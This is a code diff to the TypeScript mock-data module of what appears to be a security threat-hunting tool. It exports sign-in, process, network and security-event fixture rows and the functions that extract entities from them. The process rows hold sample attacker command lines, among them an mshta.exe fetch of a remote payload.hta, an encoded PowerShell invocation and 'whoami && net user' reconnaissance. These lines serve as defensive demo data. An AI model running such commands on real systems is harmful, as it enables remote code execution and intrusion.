@@ -1,3 +1,5 @@
+import type { QueryPlan } from '../types/queryPlan'
+
 export type EntityType = 'user' | 'host' | 'ip' | 'process' | 'country' | 'event_id'
 
 export interface ExtractedEntity {
@@ -18,6 +20,8 @@ export interface MockQueryResult {
   queryLanguage?: string
   /** Rendered query text in the platform language (populated at save time) */
   renderedQuery?: string
+  /** Neutral query plan that produced this result */
+  queryPlan?: QueryPlan
 }
 
 function ent(type: EntityType, value: string): ExtractedEntity {
@@ -53,13 +57,13 @@ function extractEntityFilter(kql: string): EntityFilter | null {
   return null
 }
 
-function matchesFilter(cellValue: string, filterValue: string): boolean {
+export function matchesFilter(cellValue: string, filterValue: string): boolean {
   return cellValue.toLowerCase().includes(filterValue.toLowerCase())
 }
 
 // ── Row datasets ─────────────────────────────────────────────────────────────
 
-const ALL_SIGNIN_ROWS: string[][] = [
+export const ALL_SIGNIN_ROWS: string[][] = [
   ['2026-05-10 08:23', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Microsoft 365'],
   ['2026-05-10 08:21', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50126', 'Azure Portal'],
   ['2026-05-10 08:19', 'jsmith@corp.com',    '185.220.101.5', 'RU / Moscow',   '50053', 'Microsoft 365'],
@@ -68,7 +72,7 @@ const ALL_SIGNIN_ROWS: string[][] = [
   ['2026-05-10 03:22', 'jdoe@corp.com',      '203.0.113.42',  'CN / Beijing',  '50126', 'Microsoft 365'],
 ]
 
-const ALL_PROCESS_ROWS: string[][] = [
+export const ALL_PROCESS_ROWS: string[][] = [
   ['2026-05-10 06:12', 'DESKTOP-42',  'jsmith',    'powershell.exe', '-EncodedCommand aQBmACAoAC...', 'a1b2c3d4e5f6...'],
   ['2026-05-10 05:45', 'DESKTOP-42',  'jsmith',    'cmd.exe',        '/c whoami && net user',          'e5f6a7b8c9d0...'],
   ['2026-05-10 04:31', 'SERVER-DC01', 'admin-svc', 'powershell.exe', '-ExecutionPolicy Bypass -File run.ps1', 'c9d0e1f2a3b4...'],
@@ -76,7 +80,7 @@ const ALL_PROCESS_ROWS: string[][] = [
   ['2026-05-10 02:55', 'LAPTOP-F19',  'lgarcia',   'mshta.exe',      'http://185.220.101.5/payload.hta','d7e8f9a0b1c2...'],
 ]
 
-const ALL_NETWORK_ROWS: string[][] = [
+export const ALL_NETWORK_ROWS: string[][] = [
   ['2026-05-10 07:32', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '1,240,832', 'ConnectionSuccess'],
   ['2026-05-10 07:15', 'DESKTOP-A7B',   '31.13.72.36',   '443', 'TCP', '985,421',   'ConnectionSuccess'],
   ['2026-05-10 06:58', 'SERVER-DC01',   '185.220.101.5', '80',  'TCP', '2,108,000', 'ConnectionSuccess'],
@@ -84,7 +88,7 @@ const ALL_NETWORK_ROWS: string[][] = [
   ['2026-05-10 04:30', 'DESKTOP-42',    '203.0.113.42',  '4444','TCP', '88,000',    'ConnectionSuccess'],
 ]
 
-const ALL_SECURITYEVENT_ROWS: string[][] = [
+export const ALL_SECURITYEVENT_ROWS: string[][] = [
   ['2026-05-10 08:00', 'SERVER-DC01',    '4624', 'jsmith',     'Successful logon'],
   ['2026-05-10 07:45', 'DESKTOP-42',     '4688', 'jsmith',     'Process created: powershell.exe'],
   ['2026-05-10 07:30', 'WORKSTATION-07', '4625', 'admin',      'Failed logon — account locked'],
@@ -94,7 +98,7 @@ const ALL_SECURITYEVENT_ROWS: string[][] = [
 
 // ── Entity extraction from filtered rows ──────────────────────────────────────
 
-function signinEntities(rows: string[][]): ExtractedEntity[] {
+export function signinEntities(rows: string[][]): ExtractedEntity[] {
   const users = [...new Set(rows.map(r => r[1]))].filter(Boolean)
   const ips   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
   const locs  = [...new Set(rows.map(r => r[3]))].filter(v => v && !v.includes('US'))
@@ -105,7 +109,7 @@ function signinEntities(rows: string[][]): ExtractedEntity[] {
   ]
 }
 
-function processEntities(rows: string[][]): ExtractedEntity[] {
+export function processEntities(rows: string[][]): ExtractedEntity[] {
   const hosts = [...new Set(rows.map(r => r[1]))].filter(Boolean)
   const users = [...new Set(rows.map(r => r[2]))].filter(Boolean)
   const procs = [...new Set(rows.map(r => r[3]))].filter(Boolean)
@@ -122,7 +126,7 @@ function processEntities(rows: string[][]): ExtractedEntity[] {
   ]
 }
 
-function networkEntities(rows: string[][]): ExtractedEntity[] {
+export function networkEntities(rows: string[][]): ExtractedEntity[] {
   const hosts = [...new Set(rows.map(r => r[1]))].filter(Boolean)
   const ips   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
   return [
@@ -131,7 +135,7 @@ function networkEntities(rows: string[][]): ExtractedEntity[] {
   ]
 }
 
-function securityEventEntities(rows: string[][]): ExtractedEntity[] {
+export function securityEventEntities(rows: string[][]): ExtractedEntity[] {
   const hosts  = [...new Set(rows.map(r => r[1]))].filter(Boolean)
   const eids   = [...new Set(rows.map(r => r[2]))].filter(Boolean)
   const users  = [...new Set(rows.map(r => r[3]))].filter(Boolean)
